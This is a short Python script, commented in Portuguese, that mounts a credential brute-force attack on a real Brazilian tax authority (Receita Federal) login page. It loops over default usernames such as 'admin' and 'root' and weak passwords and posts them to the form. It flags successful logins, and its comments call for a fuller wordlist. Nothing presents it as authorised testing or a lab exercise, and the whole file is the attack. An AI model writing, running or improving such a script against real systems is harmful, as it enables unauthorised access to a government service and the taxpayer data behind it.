
import requests

# URL da página de login da Receita Federal que encontramos
url = "https://mir.receitafederal.gov.br/auth"

# Nomes de usuário para testar (pode ser mais complexo depois)
usernames = ["admin", "root", "usuario"]

# Palavras-chave para testar (isso é só um exemplo, precisaremos de uma wordlist DE VERDADE)
passwords = ["123456", "senha", "password", "admin123"]

# Função para tentar o login
def try_login(username, password):
    # Adapte o payload conforme o formulário de login real da página
    # Isso é um CHUTE, o ideal seria inspecionar a página real.
    payload = {
        "username": username,
        "password": password
    }
    
    try:
        response = requests.post(url, data=payload, allow_redirects=False)
        # Verifica se houve um redirecionamento ou um status code de sucesso/falha no login
        # (Isso também precisaria ser ajustado após analisar a resposta real do site)
        
        # Um redirecionamento 302 (Found) geralmente indica sucesso no login
        # Ou um status 200 com conteúdo que indique login bem-sucedido
        
        if response.status_code == 302: # Exemplo: Redirecionamento após login
            print(f"✅ Sucesso com Usuário: {username}, Senha: {password}")
            return True
        elif "Invalid credentials" not in response.text and "Falha no login" not in response.text:
            # Tentar uma heurística: se não tem mensagem de erro, pode ser sucesso ou um erro diferente
            print(f"🟡 Tentativa sem mensagem de erro (pode ser sucesso ou erro inesperado) com Usuário: {username}, Senha: {password}. Status: {response.status_code}")
            return False
        else:
            print(f"❌ Falha para Usuário: {username}, Senha: {password}. Status: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"Erro de conexão: {e}")
        return False

print(f"Iniciando ataque de força bruta em: {url}")
for username in usernames:
    for password in passwords:
        if try_login(username, password):
            print("Login encontrado! Parando a busca.")
            exit() # Para assim que encontrar um login válido

print("Força bruta concluída. Nenhum login válido encontrado com as credenciais fornecidas.")
